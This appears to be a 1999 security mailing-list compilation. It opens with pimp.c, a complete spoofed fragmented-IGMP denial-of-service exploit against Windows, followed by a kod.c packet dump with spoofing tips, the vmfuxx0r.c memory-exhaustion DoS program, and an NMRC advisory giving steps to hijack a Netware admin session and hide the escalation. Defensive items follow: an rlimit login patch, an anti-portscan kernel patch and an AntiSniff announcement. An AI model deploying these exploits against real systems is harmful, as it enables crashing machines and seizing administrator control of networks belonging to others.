+** exploits bug in m$'s ip stack
+** rewrite by nyt@EFnet
+** bug found by klepto
+** usage: pimp <host>
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <time.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <netinet/in_systm.h>
+#include <netinet/ip.h>
+#include <sys/socket.h>
+
+struct igmp
+{
+        unsigned char igmp_type;
+        unsigned char igmp_code;
+        unsigned short igmp_cksum;
+        struct in_addr igmp_group;
+};
+
+#define ERROR(a) {printf("ERROR: %s\n", a);exit(-1);}
+
+u_long  resolve(char *);
+
+int main(int argc, char *argv[])
+{
+ int nsock, ctr;
+ char *pkt, *data;
+ struct ip *nip;
+ struct igmp *nigmp;
+ struct sockaddr_in s_addr_in;
+
+ setvbuf(stdout, NULL, _IONBF, 0);
+
+ printf("pimp.c by nyt\n");
+
+ if(argc != 2)
+  ERROR("usage: pimp <host>");
+
+ if((nsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
+  ERROR("could not create raw socket");
+
+ pkt = malloc(1500);
+ if(!pkt)
+  ERROR("could not allocate memory");
+
+ memset(&s_addr_in, 0, sizeof(s_addr_in));
+ memset(pkt, 0, 1500);
+
+ nip = (struct ip *) pkt;
+ nigmp = (struct igmp *) (pkt + sizeof(struct ip));
+ data = (char *)(pkt + sizeof(struct ip) + sizeof(struct igmp));
+ memset(data, 'A', 1500-(sizeof(struct ip) + sizeof(struct igmp)));
+
+ s_addr_in.sin_addr.s_addr = resolve(argv[1]);
+
+ nip->ip_v  = 4;
+ nip->ip_hl  = 5;
+ nip->ip_tos  = 0;
+ nip->ip_id  = 69;
+ nip->ip_ttl  = 255;
+ nip->ip_p  = IPPROTO_IGMP;
+ nip->ip_sum  = 0;
+ nip->ip_dst.s_addr = s_addr_in.sin_addr.s_addr;
+ nip->ip_src.s_addr = 2147100000;
+ nigmp->igmp_type = 2;
+ nigmp->igmp_code = 31;
+ nigmp->igmp_cksum = 0;
+
+ inet_aton("128.1.1.1", &nigmp->igmp_group);
+
+ printf("pimpin' dem trick-ass-bitches");
+
+ for(ctr = 0;ctr < 15;ctr++)
+ {
+  printf(".");
+  nip->ip_len  = 1500;
+  nip->ip_off  = htons(IP_MF);
+  sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,
+sizeof(s_addr_in));
+
+  nip->ip_off  = htons(1480/8)|htons(IP_MF);
+  sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,
+sizeof(s_addr_in));
+
+  nip->ip_off  = htons(5920/8)|htons(IP_MF);
+  sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,
+sizeof(s_addr_in));
+
+  nip->ip_len   = 831;
+  nip->ip_off  = htons(7400/8);
+  sendto(nsock, pkt, 831, 0, (struct sockaddr *) &s_addr_in,
+sizeof(s_addr_in));
+
+  usleep(500000);
+ }
+
+ printf("*slap* *slap* bitch, who yo daddy\n");
+ shutdown(nsock, 2);
+ close(nsock);
+}
+
+u_long resolve(char *host)
+{
+        struct hostent *he;
+        u_long ret;
+
+        if(!(he = gethostbyname(host)))
+        {
+                herror("gethostbyname()");
+                exit(-1);
+        }
+        memcpy(&ret, he->h_addr, sizeof(he->h_addr));
+        return ret;
+}
+
+----------[Pimp.c END CUT
+HERE]--------------------------------------------------
+
+
+--             Hector Leon             --
+darksun@computer-maniacs.com
+--CiMOS Computers Rep. Dom.--
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--more detail and summary of kod.c (igmp bug for windows) :
+
+Ok,
+here we go again.. 
+For those who are having trouble with kod, alot of you are using a very old
+version which was the first i submitted.
+inserted is the lastest version which should work. I wrote kod.c aka
+cherrycoke.c about 3-4 months ago. 
+It sends a fragmented igmp packet to a windows client that states that it is not
+fragmented but there are more frags to come
+windows assembles the packets and dies trying. Here is a dump of the packet if
+you want to rewrite it.
+
+/* output via tcpdump or windump95
+63.66.66.44 > 24.128.158.18: igmp-2 [v0][|igmp] (frag 52242:1480@0+) (ttl 128)
+63.66.66.44 > 24.128.158.18: (frag 52242:1480@1480+) (ttl 128)
+63.66.66.44 > 24.128.158.18: (frag 52242:1480@2960+) (ttl 128)
+63.66.66.44 > 24.128.158.18: (frag 52242:1480@4440+) (ttl 128)
+63.66.66.44 > 24.128.158.18: (frag 52242:1480@5920+) (ttl 128)
+63.66.66.44 > 24.128.158.18: (frag 52242:1480@7400+) (ttl 128)
+63.66.66.44 > 24.128.158.18: (frag 52242:1480@8880+) (ttl 128)
+63.66.66.44 > 24.128.158.18: (frag 52242:1480@10360+) (ttl 128)
+63.66.66.44 > 24.128.158.18: (frag 52242:1480@11840+) (ttl 128)
+63.66.66.44 > 24.128.158.18: (frag 52242:1480@13320+) (ttl 128)
+63.66.66.44 > 24.128.158.18: (frag 52242:1480@14800+) (ttl 128)
+63.66.66.44 > 24.128.158.18: (frag 52242:120@16280) (ttl 128)
+*/
+
+::notice the last frag it changed length..
+
+I have also ported kod to windows and please email me if you want a copy of it.
+
+As far as I can tell due to my exaustive research on the subject it works on
+95/98/98se/2k(some betas)
+
+Friends of mine such as defile/nyt/ignitor/etc have rewritten kod to suit there
+needs..
+
+I have tested kod.c out alot on many machines and it works 85% of the time for
+me.
+There are circumstances to why kod doesn't always work, some routers my drop
+igmp packets if
+the source isn't local so try spoofing =). As far as I can see netcom and alot
+of .ca servers drop the kod packets.
+So please dont bark at me =) I just found the bug, wrote the code and what you
+do with it is your concern =).
+
+
+Patch:
+(no hotfix currently)
+If you want to protect yourself from kod.c I suggest you get winroute from
+www.winroute.com
+get version 4.. It automatically drops igmp packets incoming and outgoing ha =)
+It is also a very good portmapper/NAT firewall/ip masqer as well..
+
+Shoutouts:
+amputee/ignitor/nizda/antibyte/codelogic/ill`/chord/cheesebal/traveler/winx/naz/dist/mrcide/etc...
+(gotta give shoutouts)
+
+hasta,
+
+klepto@Efnet
+or klepto@levitate.net
+de omnibus dubitandum
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--Shared memory DoS's :
+
+Hello, sorry if it's considered poor form to cross post to both bugtraq and a
+development list, but I'm too lazy to fire off two emails.
+
+While fiddling with various IPC mechanisms and reading The Design and
+Implementation of 4.4BSD (What a book!), a few things struch me as potentially
+dangerous. According to the book, when you request a shared memory segment via
+mmap(), the file isn't actually physically in memory until you start to
+trigger page faults and cause the vnode-pager to page in the data from the
+file.
+
+Then, the following passage from shmctl(2) under Linux caught my eye:
+"The user must ensure that a segment is eventually destroyed; otherwise  its 
+pages
+that were faulted in will remain in memory or swap."
+
+So as it turns out that it is in fact possible to create a DoS condition by
+requesting a truckload of shared mem, then triggering pagefaults in the entire
+shared region.
+
+Now the end result is no different than a simple fork or malloc bomb, but it is
+considerably harder to prevent on most systems.
+
+This is mainly because:
+
+  1. The system does not check rlimits for mmap and shmget (FreeBSD)
+  2. The system never bothers to offer the ability to set the rlimits for
+     virtual memory via shells, login process, or otherwise. (Linux)
+  3. b. The system does not actually allocate shared memory until a page
+        fault is triggered (this could be argued to be a feature - Linux, *BSD)
+     a. The system does not watch to make sure you don't share more memory
+        than exists. (Linux, Irix, BSD?)
+  4. With System V IPC, shared memory persists even after the process is
+     gone. So even though the kernel may kill the process after it exhausts
+     all memory from page faults, there still is 0 memory left for the system.
+     I suppose with some trickery you might be able to achieve the same results
+     by shared mmap()'ing a few large files between pairs of processes. (All)
+
+I've attached a program that will exploit these conditions using either
+shmget(), mmap(), or by getting malloc to mmap() (those are in order of
+effectivness).
+
+This program should compile on any architecture. SGI Irix is not vulnerable.
+Reading The Design and Implementation of 4.4BSD, it sounds as if the BSDs
+should all be vulnerable. FreeBSD will mmap as much memory as you tell it.
+I haven't tried page faulting the memory, as the system is not mine.
+I'd be very interested to hear about OpenBSD...
+
+Also attached is a patch to util-linux-2.9o login.c (and pathnames.h) that
+provides a means under Linux (should be pretty portable to other OS's) to set
+limits for the address space limit (RLIMIT_AS: the rlimit that controls how
+much data you can actually map into your process). The patch is based on an old
+program called lshell that set limits by wrapping your shell (I've found that
+wrapping the shell in this way caused all sorts of problems with gdb, for some
+reason).
+
+sample /etc/limits file:
+
+# Limit the user guest to 5 minutes CPU time and 8 procs, 5Mb address space
+guest C5P8V5D2
+# 60 min's CPU time, 30 procs, 15Mb data, 50 megs total address space, 5 megs
+# stack, 15 megs of RSS.
+default C60P30D15V50S5R15
+
+At the very least, I recommend default V<size of physical memory>.
+You can use lowercase letters for the next lowest order of magnitude of units.
+The comment in the patch explains it in further detail.
+
+Note even in this case, a determined user can probably just login a dozen or
+so times and use SysV IPC to steal the system memory. Core wars, anyone? :)
+
+P.S. Util-linux people: I also suspect a small memory leak due to the
+strdup(hostname) provided by Ambrose C. Li.
+
+--
+Mike Perry
+Proud user of both PGP 2.6.3i and GNU Privacy guard.
+Considering overthrowing any governments? Count me in!
+http://mikepery.linuxos.org/keys.html
+
+
+-->Attached : vmfuxx0r.c
+/*
+ * This program can be used to exploit DoS bugs in the VM systems or utility
+ * sets of certain OS's.
+ *
+ * Common problems:
+ * 1. The system does not check rlimits for mmap and shmget (FreeBSD)
+ * 2. The system never bothers to offer the ability to set the rlimits for
+ *    virtual memory via shells, login process, or otherwise. (Linux)
+ * 3. b. The system does not actually allocate shared memory until a page fault
+ *       is triggered (this could be argued to be a feature - Linux, *BSD)
+ *    a. The system does not watch to make sure you don't share more memory
+ *       than exists. (Linux, Irix, BSD?)
+ * 4. With System V IPC, shared memory persists even after the process is
+ *    gone. So even though the kernel may kill the process after it exhausts all
+ *    memory from page faults, there still is 0 memory left for the system.
+ *    (All)
+ *
+ * This program should compile on any architecture. SGI Irix is not
+ * vulnerable. From reading The Design and Implementation of 4.4BSD it sounds
+ * as if the BSDs should all be vulnerable. FreeBSD will mmap as much memory
+ * as you tell it. I haven't tried page faulting the memory, as the system is
+ * not mine. I'd be very interested to hear about OpenBSD...
+ *
+ * This program is provided for vulnerability evaluation ONLY. DoS's aren't
+ * cool, funny, or anything else. Don't use this on a machine that isn't
+ * yours!!!
+ */
+#include <stdio.h>
+#include <errno.h>
+#include <sys/ipc.h>
+#include <sys/shm.h> /* redefinition of LBA.. PAGE_SIZE in both cases.. */
+#ifdef __linux__
+#include <asm/shmparam.h>
+#include <asm/page.h>
+#endif
+#include <sys/types.h>
+#include <stdio.h>
+#include <sys/stat.h>
+#include <sys/fcntl.h>
+#include <sys/mman.h>
+
+int len;
+
+#define __FUXX0R_MMAP__
+
+/* mmap also implements the copy-on-fault mechanism, but because the only way
+ * to easily exploit this is to use anonymous mappings, once the kernel kills
+ * the offending process, you can recover. (Although swap death may still
+ * occurr */
+/* #define __FUXX0R_MMAP__ */
+
+/* Most mallocs use mmap to allocate large regions of memory. */
+/* #define __FUXX0R_MMAP_MALLOC__ */
+
+
+/* Guess what this option does :) */
+#define __REALLY_FUXX0R__
+
+/* From glibc 2.1.1 malloc/malloc.c */
+#define DEFAULT_MMAP_THRESHOLD (128 * 1024)
+
+#ifndef PAGE_SIZE
+# define PAGE_SIZE 4096
+#endif
+
+#ifndef SHMSEG
+# define SHMSEG 256
+#endif
+
+#if defined(__FUXX0R_MMAP_MALLOC__)
+void *mymalloc(int n)
+{
+    if(n <= DEFAULT_MMAP_THRESHOLD)
+        n = DEFAULT_MMAP_THRESHOLD + 1;
+    return malloc(n);
+}
+
+void myfree(void *buf)
+{
+    free(buf);
+}
+#elif defined(__FUXX0R_MMAP__)
+void *mymalloc(int n)
+{
+    int fd;
+    void *ret;
+    fd = open("/dev/zero", O_RDWR);
+    ret = mmap(0, n, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
+    close(fd);
+    return (ret == (void *)-1 ? NULL : ret);
+}
+void myfree(void *buf)
+{
+    munmap(buf, len);
+}
+
+#elif defined(__FUXX0R_SYSV__)
+void *mymalloc(int n)
+{
+    char *buf;
+    static int i = 0;
+    int shmid;
+    i++; /* 0 is IPC_PRIVATE */
+    if((shmid = shmget(i, n, IPC_CREAT | SHM_R | SHM_W)) == -1)
+    {
+#if defined(__irix__)
+        if (shmctl (shmid, IPC_RMID, NULL))
+        {
+            perror("shmctl");
+        }
+#endif
+
+        return NULL;
+    }
+    if((buf = shmat(shmid, 0, 0)) == (char *)-1)
+    {
+#if defined(__irix__)
+        if (shmctl (shmid, IPC_RMID, NULL))
+        {
+            perror("shmctl");
+        }
+#endif
+        return NULL;
+    }
+
+#ifndef __REALLY_FUXX0R__
+    if (shmctl (shmid, IPC_RMID, NULL))
+    {
+        perror("shmctl");
+    }
+#endif
+
+    return buf;
+}
+
+void myfree(void *buf)
+{
+    shmdt(buf);
+}
+#endif
+
+#ifdef __linux__
+void cleanSysV()
+{
+    struct shmid_ds shmid;
+    struct shm_info shm_info;
+    int id;
+    int maxid;
+    int ret;
+    int shid;
+    maxid = shmctl (0, SHM_INFO, (struct shmid_ds *) &shm_info);
+    printf("maxid %d\n", maxid);
+    for (id = 0; id <= maxid; id++)
+    {
+        if((shid = shmctl (id, SHM_STAT, &shmid)) < 0)
+            continue;
+
+        if (shmctl (shid, IPC_RMID, NULL))
+        {
+            perror("shmctl");
+        }
+        printf("id %d has %d attachments\n", shid, shmid.shm_nattch);
+        shmid.shm_nattch = 0;
+        shmctl(shid, IPC_SET, &shmid);
+        if(shmctl(shid, SHM_STAT, &shmid) < 0)
+        {
+            printf("id %d deleted sucessfully\n", shid);
+        }
+        else if(shmid.shm_nattch == 0)
+        {
+            printf("Still able to stat id %d, but has no attachments\n", shid);
+        }
+        else
+        {
+            printf("Error, failed to remove id %d!\n", shid);
+        }
+
+    }
+}
+#endif
+
+int main(int argc, char **argv)
+{
+    int shmid;
+    int i = 0;
+    char *buf[SHMSEG * 2];
+    int max;
+    int offset;
+    if(argc < 2)
+    {
+        printf("Usage: %s <[0x]size of segments>\n", argv[0]);
+#ifdef __linux__
+        printf("    or %s --clean (destroys all of IPC space you have permissions to)\n", argv[0]);
+#endif
+        exit(0);
+    }
+
+#ifdef __linux__
+    if(!strcmp(argv[1], "--clean"))
+    {
+        cleanSysV();
+        exit(0);
+    }
+#endif
+
+    len = strtol(argv[1], NULL, 0);
+    for(buf[i] = mymalloc(len); i < SHMSEG * 2 && buf[i] != NULL; buf[++i] = mymalloc(len))
+        ;
+
+    max = i;
+    perror("Stopped because");
+    printf("Maxed out at %d %d byte segments\n", max, len);
+#if defined(__FUXX0R_SYSV__) && defined(SHMMNI)
+    printf("Despite an alleged max of %d (%d per proc) %d byte segs. (Page "
+            "size: %d), \n", SHMMNI, SHMSEG, SHMMAX,  PAGE_SIZE);
+#endif
+
+#ifdef __REALLY_FUXX0R__
+    fprintf(stderr, "Page faulting alloced region... Have a nice life!\n");
+    for(i = 0; i < max; i++)
+    {
+        for(offset = 0; offset < len; offset += PAGE_SIZE)
+        {
+            buf[i][offset] = '*';
+        }
+        printf("wrote to %d byes of memory, final offset %d\n", len, offset);
+    }
+    // never reached :(
+#else
+    for(i = 0; i <= max; i++)
+    {
+        myfree(buf[i]);
+    }
+#endif
+    exit(42);
+}
+
+
+-->Attached : Login.patch
+diff -ur ./util-linux-2.9o/lib/pathnames.h ./util-linux-2.9o-mp/lib/pathnames.h
+--- ./util-linux-2.9o/lib/pathnames.h   Sun Oct 11 14:19:16 1998
++++ ./util-linux-2.9o-mp/lib/pathnames.h        Wed Jul 14 22:51:13 1999
+@@ -86,6 +86,7 @@
+
+ #define _PATH_SECURE           "/etc/securesingle"
+ #define _PATH_USERTTY           "/etc/usertty"
++#define _PATH_LIMITS           "/etc/limits"
+
+ #define _PATH_MTAB             "/etc/mtab"
+ #define _PATH_UMOUNT           "/bin/umount"
+diff -ur ./util-linux-2.9o/login-utils/login.c ./util-linux-2.9o-mp/login-utils/login.c
+--- ./util-linux-2.9o/login-utils/login.c       Sat Mar 20 14:20:16 1999
++++ ./util-linux-2.9o-mp/login-utils/login.c    Wed Jul 14 22:49:24 1999
+@@ -185,6 +185,7 @@
+ char *stypeof P_((char *ttyid));
+ void checktty P_((char *user, char *tty, struct passwd *pwd));
+ void sleepexit P_((int eval));
++void setup_limits P_(struct passwd *pwd);
+ #ifdef CRYPTOCARD
+ int cryptocard P_((void));
+ #endif
+@@ -1110,6 +1111,8 @@
+
+     childArgv[childArgc++] = NULL;
+
++    setup_limits(pwd);
++
+     execvp(childArgv[0], childArgv + 1);
+
+     if (!strcmp(childArgv[0], "/bin/sh"))
+@@ -1120,6 +1123,161 @@
+
+     exit(0);
+ }
++
++/* Most of this code ripped from lshell by Joel Katz */
++void process(char *buf)
++{
++    /* buf is of the form [Fn][Pn][Ct][Vm][Sm][Rm][Lm][Dm] where */
++    /* F specifies n max open files */
++    /* P specifies n max procs */
++    /* c specifies t seconds of cpu */
++    /* C specifies t minutes of cpu */
++    /* v specifies m kbs of total virtual memory (address space) */
++    /* V specifies m megs of total virtual memory (address space) */
++    /* s specifies m kbs of stack */
++    /* S specifies m megs of stack */
++    /* r specifies m kbs of RSS */
++    /* R specifies m megs of RSS */
++    /* l specifies m kbs of locked (non-swappable) memory */
++    /* L specifies m megs of locked (non-swappable) memory */
++    /* d specifies m kbs of Data segment */
++    /* D specifies m megs of Data segment */
++
++    struct rlimit rlim;
++    char *pp = buf;
++    int i;
++
++    while(*pp!=0)
++    {
++       i = 1;
++       switch(*pp++)
++       {
++           case 'f':
++           case 'F':
++               i = atoi(pp);
++               if(!i)
++                   break;
++               rlim.rlim_cur = i;
++               rlim.rlim_max = i;
++               setrlimit(RLIMIT_NOFILE, &rlim);
++               break;
++           case 'p':
++           case 'P':
++               i = atoi(pp);
++               if(!i)
++                   break;
++               rlim.rlim_cur = i;
++               rlim.rlim_max = i;
++               setrlimit(RLIMIT_NPROC, &rlim);
++               break;
++           case 'C':
++               i = 60;
++           case 'c':
++               i *= atoi(pp);
++               if(!i)
++                   break;
++               rlim.rlim_cur = i;
++               rlim.rlim_max = i;
++               setrlimit(RLIMIT_CPU, &rlim);
++               break;
++           case 'V':
++               i = 1024;
++           case 'v':
++               i *= atoi(pp)*1024;
++               if(!i)
++                   break;
++               rlim.rlim_cur = i;
++               rlim.rlim_max = i;
++#if defined(RLIMIT_AS) /* Linux */
++               setrlimit(RLIMIT_AS, &rlim);
++#else if defined(RLIMIT_VMEM) /* Irix */
++               setrlimit(RLIMIT_VMEM, &rlim);
++#endif
++               break;
++           case 'S':
++               i = 1024;
++           case 's':
++               i *= atoi(pp)*1024;
++               if(!i)
++                   break;
++               rlim.rlim_cur = i;
++               rlim.rlim_max = i;
++               setrlimit(RLIMIT_STACK, &rlim);
++               break;
++           case 'R':
++               i = 1024;
++           case 'r':
++               i *= atoi(pp)*1024;
++               if(!i)
++                   break;
++               rlim.rlim_cur = i;
++               rlim.rlim_max = i;
++               setrlimit(RLIMIT_RSS, &rlim);
++               break;
++           case 'L':
++               i = 1024;
++           case 'l':
++               i *= atoi(pp)*1024;
++               if(!i)
++                   break;
++               rlim.rlim_cur = i;
++               rlim.rlim_max = i;
++               setrlimit(RLIMIT_MEMLOCK, &rlim);
++               break;
++           case 'D':
++               i = 1024;
++           case 'd':
++               i *= atoi(pp)*1024;
++               if(!i)
++                   break;
++               rlim.rlim_cur = i;
++               rlim.rlim_max = i;
++               setrlimit(RLIMIT_DATA, &rlim);
++               break;
++       }
++    }
++}
++
++void setup_limits(struct passwd *pw)
++{
++    FILE *fp;
++    int i;
++    char buf[200], name[20], limits[64];
++    char *p;
++
++    if(pw->pw_uid == 0)
++    {
++       return;
++    }
++
++    if((fp = fopen(_PATH_LIMITS,"r")) == NULL)
++    {
++       return;
++    }
++
++    while(fgets(buf, 200, fp) != NULL)
++    {
++       if(buf[0] == '#')
++           continue;
++
++       p = strchr(buf, '#');
++       if(p)
++           *p = 0;
++
++       i=sscanf(buf, "%s %s", name, limits);
++
++       if(!strcmp(name, pw->pw_name))
++       {
++           if(i==2)
++               process(limits);
++           fclose(fp);
++           return;
++       }
++    }
++    fclose(fp);
++    process(limits); /* Last line is default */
++}
++
+
+ void
+ getloginname()
+ 
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-- NMRC Advisory: Netware 5 Client Hijacking :
+
+_______________________________________________________________________________
+
+                          Nomad Mobile Research Centre
+                                 A D V I S O R Y
+                                  www.nmrc.org
+                          Jitsu-Disk  [jitsu@nmrc.org]
+                        Simple Nomad [thegnome@nmrc.org]
+                                    15Jul1999
+_______________________________________________________________________________
+
+                              Platform : Novell Netware
+                           Application : NDS/NCP
+                              Severity : High
+
+
+Synopsis
+--------
+
+Armed with the MAC address of the Administrator, an intruder can hijack an
+Admin's session and issue NCP calls as the the Admin on Netware servers.
+
+Tested configuration
+--------------------
+
+The bug was tested with the following configuration :
+
+Novell Netware 5, Service Pack 2 (with IPX configured)
+Latest Client Software for Windows 95/98
+
+Also confirmed on Netware 4.x.
+
+Bug(s) report
+-------------
+
+This is an old bug. We reported it to Novell over a year ago, and even released
+exploit code (see http://www.nmrc.org/pandora/). Since several people had
+problems using the exploit code and Novell still hasn't corrected (to our
+satisfaction) all of the problems with Netware 5, we've updated the exploit
+code in the new Pandora v4, which is now in beta release. While Netware/IP is
+the recommended path for Netware 5, most organizations using Netware are still
+using Novell's proprietary IPX protocol for server access. IPX is required for
+this exploit to work.
+
+In essence, IPX fragmented requests/replies (NCP call 0x68) are not signed if
+the packet signature level is not set to 3. Setting it to 3 on the server side
+is good, but if the client is set at 1, it is possible to spoof or hijack a
+portion of the client's session. If the target client is the Admin, we can tell
+the server to make us security equivalent to the Admin. Please refer to the
+details at http://www.nmrc.org/pandora/ncp.txt, especially sections 6 and
+7, which detail how the attack works.
+
+The new Pandora Online utility will simply require you insert the MAC address
+of the Admin's workstation into a dialog box, and Pandora will handle the rest
+of the sniffing required to make the attack work. As always, placement of your
+attack box is critical:
+
+----------    ----------    ----------   -------------
+| Admin  |    | Attack |    | Router |   | Netware 5 |
+| Client |    |  Box   |    |        |   |   Server  |
+----------    ----------    ----------   -------------
+    |             |           |    |           |
+    ---------------------------    -------------
+
+So here are the steps:
+
+0. Admin client is Packet Signature Level 1, and server is Packet Signature
+Level 3.
+1. Attack box gets Admin's MAC address, and inserts it into the Pandora
+Online tool. Attacker has the option to adjust other parameters as needed, but
+the main one is the MAC address.
+2. Admin performs actions dealing with NDS that use fragmented packets (normal
+administrator activity will give us the needed packets quickly).
+3. Attack box sends forged request to server, making us security equivalent to
+Admin.
+4. Netware 5 server accepts forged packets.
+5. Admin client loses connection from server as its packet sequence is now out
+of whack.
+6. Attacker adjusts security settings for self so that the attacker has full
+access to entire tree, and removes "equal to Admin", so s/he will not show up
+on a basic "who's equiv to me" investigation by Admin.
+
+Caveats:
+
+0. This attack will fail in a switched environment since sniffing is involved.
+1. This is a race. If the Admin client beats the attacker, the attacker must try
+again.
+2. Obviously the attacker being on the same Ethernet segment as the Admin will
+help considerably in an attack. In theory this should work if you are anywhere
+in between the Admin client and the server, although you will need to use the
+MAC address of the router interface the Admin's session is coming from. At best,
+this may not work at all, but is still theoretically possible.
+3. In theory this could be adapted to a Netware/IP environment, as Novell's
+TCP/IP stack is vulnerable to sequence number prediction. We have not explored
+adapting Pandora exploit code over to a pure IP environment, but will explore
+this possibility in future Pandora releases.
+
+Solution/Workaround
+-------------------
+
+Use Packet Signature Level 3 everywhere, and make sure clients cannot touch
+their own signature settings. LAN Admins should never access a server unless
+using Level 3, and the security on the workstation should be restrictive enough
+to prevent unauthorized adjustments (i.e. use a locked-down NT client with no
+server services running, behind a locked door, although this simply places your
+trust in Microsoft). Use switched Ethernet.
+
+Alternately, you can ask Novell to patch things. We did our part a year ago.
+
+Comments
+--------
+
+Simple Nomad had to leave Las Vegas right after Black Hat due to a minor
+medical emergency at home, and missed DefCon. This advisory was one of the
+things slated to be discussed during the DefCon presentation.
+
+As stated, Novell was contacted regarding this bug in June of 1998, 13 months
+ago. We got this to work in a lab setting. YMMV.
+
+The new Pandora v4 includes all of the Pandora v3 attacks against Netware 4
+updated to work against Netware 5. It was developed with 100% freeware libraries
+and compilers. We are proud that this code doesn't look like a normal 95/98/NT,
+the GUI was developed on Linux. Pandora v4 is 100% freeware. Source code is
+freely available.
+
+We always recommend using the latest versions of Netware with the latest
+patches, and using the maximum security settings at all times on Netware
+servers.
+
+
+
+
+
+
+--- to prevert port scanning in linux 2.0.x
+
+
+
+Hi,
+
+        It seems that some bugtraq readers still runs linux 2.0.3[67].
+        In order to prevent SYN, FIN, Xmas, NULL tcp scan and
+        maybe connect() scan (for exaple it's true with nmap,
+        false with strobe) it's possible to apply this kernel patch.
+
+        This stupid patch change the sequence
+                SYN ---> closed port
+                <--- RST
+        to
+                SYN ---> closed port
+                <--- SYN|ACK
+                ACK --->
+                <--- RST
+
+        and answers RST to FIN, Xmas and NULL tcp flags even
+        if the port is open, like win*.
+
+        If an attacker scans a patched host it gets all
+        ports are open, so it gets nothing.
+
+        The patch is tested on linux 2.0.36, maybe it's
+        good even for 2.0.37.
+
+bye,
+antirez
+
+diff -u -r linux/net/ipv4/tcp_input.c /usr/src/linux-2.0.36/net/ipv4/tcp_input.c
+--- linux/net/ipv4/tcp_input.c  Sat Jul 17 11:21:01 1999
++++ /usr/src/linux-2.0.36/net/ipv4/tcp_input.c  Sat Jul 17 12:00:13 1999
+@@ -46,6 +46,7 @@
+  *                                     </RANT>
+  *     George Baeslack         :       SIGIO delivery on accept() bug that
+  *                                     affected sun jdk.
++ *     Salvatore Sanfilippo    :       Prevents SYN, FIN, Xmass, NULL scan.
+  */
+
+ #include <linux/config.h>
+@@ -2464,6 +2465,12 @@
+                                        }
+                                }
+ #endif
++                               tcp_send_reset(daddr,saddr,th,sk->prot,opt,dev,0, 255);
++                       }
++
++                       /* resets FIN, Xmas, NULL */
++                       if (!th->syn && !th->ack && !th->rst && ip_chk_addr(daddr)==IS_MYADDR)
++                       {
+                                tcp_send_reset(daddr,saddr,th,sk->prot,opt,dev,0, 255);
+                        }
+
+diff -u -r linux/net/ipv4/tcp_output.c /usr/src/linux-2.0.36/net/ipv4/tcp_output.c
+--- linux/net/ipv4/tcp_output.c Sat Jul 17 11:21:01 1999
++++ /usr/src/linux-2.0.36/net/ipv4/tcp_output.c Sat Jul 17 11:56:35 1999
+@@ -759,7 +759,7 @@
+        t1->source = th->dest;
+        t1->doff = sizeof(*t1)/4;
+        t1->rst = 1;
+-
++
+        if(th->ack)
+        {
+                t1->seq = th->ack_seq;
+@@ -770,7 +770,15 @@
+                if(!th->syn)
+                        t1->ack_seq = th->seq;
+                else
++               {
+                        t1->ack_seq = htonl(ntohl(th->seq)+1);
++                       /* send bogus syn/ack */
++                       t1->rst = 0;
++                       t1->syn = 1;
++                       t1->ack = 1;
++                       if (th->fin)
++                               t1->fin = 1; /* as 2.0.3x we answer SAF */
++               }
+        }
+
+
+
+
+
+
+--- L0pht Heavy Industries - AntiSniff :
+
+
+
+For Immediate Release
+
+L0pht Heavy Industries Releases a Public Beta of Its
+Revolutionary New AntiSniff Network Security Software
+Boston, MA - July 22, 1999 - L0pht Heavy Industries, a world renowned
+computer security think tank, today announced the public beta release of its
+AntiSniff network security software, which can detect attackers
+surreptitiously monitoring a computer network.
+
+"AntiSniff is a whole new breed of network security tool, designed to detect
+the attack patterns used in compromising a computer network, instead of
+merely being reactive to already known vulnerabilities.", said Dr. Mudge,
+Chief Scientist at L0pht Heavy Industries.
+
+AntiSniff, which operates on both Windows NT and UNIX operating systems,
+will detect remote computers that are packet sniffing, that is, monitoring
+all network communications.
+
+In a recent survey, three-quarters of U.S. corporations, government
+agencies, financial institutions and universities reported suffering
+financial losses due to computer security breaches. Some of these attacks
+have become quite famous, such as the successfull attacks against the Senate
+& FBI webservers. Other attacks, however, don't get any media attention, and
+are far worse than the defacement of a web site. These attacks involve the
+invasion of government and corporate secrets, and personal privacy. Many of
+these attacks rely on packet sniffing to penetrate deep into a computer
+network.
+
+Network communication can be likened to large group of people standing
+together in a room and talking. When people talk to each other, others
+nearby have the ability to listen in. When computers communicate over
+networks, they normally only listen to communications destined to
+themselves. However, they also have the ability to enter promiscous mode,
+which allows them to listen to communications that are destined to other
+computers.
+
+When an attacker successfully compromises a computer, they install what is
+known as a packet sniffer, a tool that puts the computer into promiscuous
+mode, thus allowing them to monitor and record all network communications.
+The private information they gather, such as account names, passwords,
+credit cards, and even e-mail, is then used to compromise other computers.
+This is how, from one weak computer in a computer network, many computers,
+and the information they contain can be compromised. Until now, it has been
+impossible for network administrators to remotely detect if computers were
+listening in on all network communications.
+
+L0pht Heavy Industries' AntiSniff stops all this, by giving network
+administrators and information security professionals the ability to
+remotely detect computers that are packet sniffing, regardless of the
+operating system. Dr. Mudge explains, "AntiSniff works by running a number
+of non-intrusive tests, in a variety of fashions, which can determine
+whether or not a remote computer is listening in on all network
+communications. Now it is impossible for an attacker who is sniffing to
+hide."
+
+Current network security tools, such as network scanners, work by probing
+machines for software that contains bugs or software that's misconfigured.
+Intrusion Detection Systems (IDS), work by finding malicious signatures in
+network traffic. AntiSniff, on the other hand, is the first of it's kind. It
+remotely detects the passive act of eavesdropping on network communications.
+It will even detect packet sniffers installed by a rogue insider who may
+have legitimate administrative access to a machine, but still should not be
+monitoring all network traffic.
+
+The AntiSniff public beta is released for Windows NT, complete with a fully
+featured graphical interface, report generating tools, and alarm system. It
+is designed so that it can be used to quickly scan a network or scan
+continuously, triggering alarms when a "packet sniffing" machine is
+detected.
+
+The beta version has been made available free to all who would like to try
+it out. L0pht hopes to have the commercial release ready within a few weeks.
+Retail and site license pricing have not yet been determined.
+
+To further the research of the security community as a whole, as they have
+in previous products, L0pht will be releasing AntiSniff as a UNIX
+command-line tool, complete with full source code.
+
